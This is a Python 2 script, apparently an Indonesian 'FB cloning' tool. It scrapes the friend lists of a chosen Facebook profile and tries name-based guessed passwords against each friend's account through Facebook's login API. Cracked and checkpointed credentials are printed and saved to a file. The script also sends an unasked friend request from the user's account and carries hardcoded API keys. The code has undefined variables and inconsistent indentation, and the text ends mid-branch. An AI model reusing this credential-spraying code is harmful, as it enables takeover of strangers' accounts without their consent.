#!/usr/bin/python2
#coding=utf-8
#ANGGA THE OFFICAL ROGRAMMER 
#FBCLONING COMMMAD MAKER 
#YOUTUBE L3L4K1 S3J4T1


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:THE ANGGA
#### LOGO ####
logo = """
           \033[1;91m┈┈╱▔▔▔▔▔╲┈┈┈┈┈ ┈
           \033[1;92m┈┈▏╭╮┈╭╮▕┈┈┈┈┈ ┈
           \033[1;91m╭━▏╰╯┈╰╯▕━╮╭━┳ ╮
           \033[1;92m┃╰╮┈▕▏▎┈╭╯┃┃┫┃ ┃
           \033[1;91m╰━▏╭━━━╮▕━╯┃╰╯ ╯
           \033[1;91m▂╱▏┃┈┏┓┃▕╲╭┻━╮ ┈
           \033[1;92m▏╭╲┗━┻┻┛╱▕┃┳━╯ ┈
           \033[1;91m▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
           \033[1;92m█🄳🄸🅅🄸🄰🅃🄾🅁 🅃🄴🄰🄼█ 
           \033[1;91m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
	   \033[1;47m \033[1;31m Coder by : THEANGGA \033[1;0m     
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;91mAUTHOR : \033[0;92m AKHMAD ERLANGGA                     \033[0;91m      ║
\033[0;91m║\033[0;91mGITHUB :\033[0;92m https://github.com/TheAngga   \033[0;91m     ║
\033[0;91m║\033[0;91mFB PAGE :\033[0;92m https://m.facebook.com/lol.angga \033[0;91m   ║
\033[0;95m╰════════════════════════════════════════════╯
\033[1;94m⊱══════════════════⊱═⊰DISCLAIMER⊱═⊰══════════════════⊰
\033[1;91mWARNING :\033[1;93mUSE A FRESH ACCOUNT TO LOGIN, DO NOT USE OLD ACCOUNT LOGIN OTHERWISE YOUR ACCOUNT WILL BE BLOCK
\033[1;91mWIFI OR MOBILE DATA :\033[1;93mDO NOT USE WIFI, ONLY MOBILE DATA FOR CLONING ACCOUNT 
\033[1;91mID NOT FOUND PROBLEM :\033[1;93mCOPY TO PROFILE PHOTO USERNAME AND THEN PASTE IN TERMUX
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
back = 0
threads = []
sucessful = []
checkpoint = []
oks = []
action_failed = []
idfriends = []
idfromfriends = []
member_id = []
email= []
number = []
id = []
em = []
email_from_friends = []
hp = []
hpfromfriends = []
reaction = []
reactiongroup = []
comment = []
group_comment = []
listgroup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
jalan('\033[1;94m───────█████████████████████')
jalan('\033[1;94m────████▀─────────────────▀████')
jalan('\033[1;94m──███▀───────────────────────▀███')
jalan('\033[1;94m─██▀───────────────────────────▀██')
jalan('\033[1;94m█▀───────────────────────────────▀█')
jalan('\033[1;94m█─────────────────────────────────█')
jalan('\033[1;94m█─────────────────────────────────█')
jalan('\033[1;94m█───────🅳🅸🆅🅸🅰🆃🅾🆁 🆃🅴🅰🅼────────█')
jalan('\033[1;91m█───█████─────────────────█████───█')
jalan('\033[1;91m█──██▓▓▓███─────────────███▓▓▓██──█')
jalan('\033[1;91m█──██▓▓▓▓▓██───────────██▓▓▓▓▓██──█')
jalan('\033[1;91m█──██▓▓▓▓▓▓██─────────██▓▓▓▓▓▓██──█')
jalan('\033[1;91m█▄──████▓▓▓▓██───────██▓▓▓▓████──▄█')
jalan('\033[1;91m▀█▄───▀███▓▓▓██─────██▓▓▓███▀───▄█▀')
jalan('\033[1;91m──█▄────▀█████▀─────▀█████▀────▄█')
jalan('\033[1;94m─▄██───────────▄█─█▄───────────██▄')
jalan('\033[1;94m─███───────────██─██───────────███')
jalan('\033[1;94m─███───────────────────────────███')
jalan('\033[1;94m──▀██──██▀██──█──█──█──██▀██──██▀')
jalan('\033[1;94m───▀████▀─██──█──█──█──██─▀████▀')
jalan('\033[1;94m────▀██▀──██──█──█──█──██──▀██▀')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m──────────██──█──█──█──██')
jalan('\033[1;94m───────────█▄▄█▄▄█▄▄█▄▄█')
jalan('\033[1;47m                \033[1;31 AKHMAD ERLANGGA                  \033[1;0m     ') 
jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 
jalan('\033[1;91m      \033[1;91m ENTER TOOL USERNAME AND PASSWORD \033[1;0m     ') 
jalan('⊱⊹⊰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱⊹⊰') 

CorrectUsername = "angga"
CorrectPassword = "gans"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[#] \x1b[0;36m Enter Username\x1b[1;92m➤ ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[#] \x1b[0;36m Enter Password\x1b[1;92m➤ ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username  #DEV ANGGA
            loop = 'false'
        else:
            print "Wrong password!"
            os.system('xdg-open https://m.youtube.com/channel/UCdwTmwVeZjIO3lRaUK6F8Ag')
    else:
        print "Wrong username!"
        os.system('xdg-open https://m.youtube.com/channel/UCdwTmwVeZjIO3lRaUK6F8Ag')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	print "\033[1;91m>>>\033[1;91m[1]\033[1;93m Login with Facebook  "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[2]\033[1;94m Login with access token "
        time.sleep(0.05)
        print "\033[1;91m>>>\033[1;91m[3]\033[1;93m Download Access token"
	time.sleep(0.05)
	print "\033[1;91m>>>\033[1;91m[4]\033[1;94m Subscribe L3L4K1 S3J4T1" 
	time.sleep(0.05) 
	print "\033[1;91m>>>\033[1;91m[5]\033[1;93m See all abm commmand" 
	time.sleep(0.05)
	print "\033[1;91m>>>\033[1;91m[0]\033[1;96m Logout        "
	jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option═╬══►\033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
	        login()
	elif peak =="4":
		os.system('xdg-open https://m.youtube.com/channel/UCdwTmwVeZjIO3lRaUK6F8Ag')
		login()
	elif unikers =="5":
		os.system('xdg-open https://github.com/Tech-abm')
		login()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
		
	
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
		jalan('\033[1;96m[✾]\x1b[1;91mDO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		jalan('\033[1;96m[✾]\x1b[1;91mUSE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;96m[✾]' )
		id = raw_input('\033[1;96m[!!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		jalan("\033[1;96m⊱⋕⊰══════════════════════════════════════⊱⋕⊰") 
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://m.youtube.com/channel/UCdwTmwVeZjIO3lRaUK6F8Ag')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[+]\033[1;92mToken\033[1;91m :\033[1;95mEnter accees token link without Fb login>> ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰"  ) 
	print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	jalan( "\033[1;93m⊱⋕⊰═════════════════════════════════════════⊱⋕⊰") 
	print "\033[1;32;98m[1] \033[1;96m>> start Cloning "																														
	print "\033[1;32;98m[0] \033[1;96m>> Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	jalan( "\x1b[1;32;92m[1] \033[1;33;98m>> Hack From Public ID") 
	jalan( "\x1b[1;32;36m[0] \033[1;33;96m>> Back") 
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰\n" 
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print "\033[1;96m⊱⋕⊰═══════════════════════════════════════⊱⋕⊰\n" 
		idt = raw_input("\033[1;96m[⊱⋕⊰]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[⊱⋕⊰] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[⊱⋕⊰] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[⊱⋕⊰] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;32;40m[⊱⋕⊰] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m   ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m  ❈"
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 

	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:Tech-abm
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '12345'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'								
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['last_name'] + '12345'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '123456'										
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'						
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['last_name']+'123456'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['first_name']+'786'									
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  ✓  ] \x1b[1;92mValid100%'											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ ✖ ] \x1b[1;96mInvalid'
				                                                                                       print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
